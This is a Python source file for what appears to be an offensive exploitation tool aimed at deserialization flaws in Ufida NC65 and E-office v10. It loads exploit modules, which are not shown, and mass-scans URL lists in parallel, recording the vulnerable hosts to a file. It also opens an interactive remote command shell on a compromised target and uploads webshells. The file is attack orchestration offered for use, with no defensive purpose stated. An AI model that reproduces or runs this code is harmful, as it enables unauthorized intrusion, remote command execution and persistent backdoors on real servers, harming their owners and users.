from concurrent.futures import ThreadPoolExecutor, as_completed
from alive_progress import alive_bar
from prompt_toolkit import HTML, PromptSession
from typing import List, Optional, Tuple
from libs.custom_print import custom_print
from prompt_toolkit.history import InMemoryHistory
from model.model import Target
    

class Scanner:
    def __init__(self, target:Optional[Target], flag:str) -> None:
        self.target = target
        if flag == "1":
            from modules.ufida_ConfigResourceServlet import exp, upload_shell
            self.target.vulnerable_name="Ufida_NC65_ConfigResourceServlet_Deserialization"
        elif flag == "2":
            from modules.e_office_af import exp, upload_shell
            self.target.vulnerable_name="Eoffice_v10_Auth_File_Laravel_Deserialization"
        self.exp = exp
        self.upload_webshell = upload_shell

    def execute_command(self,java_path:Optional[str]=None, php_path:Optional[str]=None,cmd: str = "whoami", verbose: bool = True) -> str:
        result = self.exp(target=self.target, cmd=cmd, verbose=verbose)
        return result
    
    
    def check_single_url(self, url:Optional[str])-> Tuple[str, bool]:
        self.target.url = url
        result = self.execute_command(verbose=False)
        if not result or result.isspace():
            result=False
        else:
            result=True
        if result == False:
            custom_print(f"{url} is not vulnerabled.", "-")
        elif result == True:
            custom_print(f"{url} is vulnerabled.", "+")
        else:
            custom_print("Unkown Error.", "!")
            exit()
        return f"{url} is vulnerable to {self.target.vulnerable_name}: {result}", result
    

    def check_multi_urls(self, urls: List[str], max_workers: int = 20, output_path="Output.txt") -> None:
        with ThreadPoolExecutor(max_workers=max_workers) as executor, alive_bar(
                len(urls), enrich_print=False
        ) as bar:
            futures = {executor.submit(self.check_single_url, url): url for url in urls}
            for future in as_completed(futures):
                result, is_vulnerable = future.result()
                if is_vulnerable and output_path:
                    with open(output_path, "a") as file:
                        file.write(result + "\n")
                bar()

    def interactive_shell(self) -> None:
        initial_result = self.execute_command()
        if initial_result:
            custom_print(
                f"{self.target.url} is vulnerable to {self.target.vulnerable_name}: {initial_result}", "!"
            )
            custom_print("Opening interactive shell...", "+")
            session: PromptSession = PromptSession(history=InMemoryHistory())
            while 1:
                try:
                    cmd: str = session.prompt(
                        HTML("<ansiyellow><b>$ </b></ansiyellow>"), default=""
                    ).strip()
                    if cmd.lower() == "exit":
                        break
                    elif cmd.lower() == "clear":
                        self.console.clear()
                        continue
                    output: str = self.execute_command(cmd)
                    if output:
                        print(f"{output}\n")
                except KeyboardInterrupt:
                    print("Exiting interactive shell...", "!")
                    break
        else:
            custom_print("System is not vulnerable or check failed.", "-")
        

    def upload_webshell(self,file_path:str)->None:
        r = self.upload_shell(target=self.target,file_path=file_path)
        if r:
            print(r)
        return 
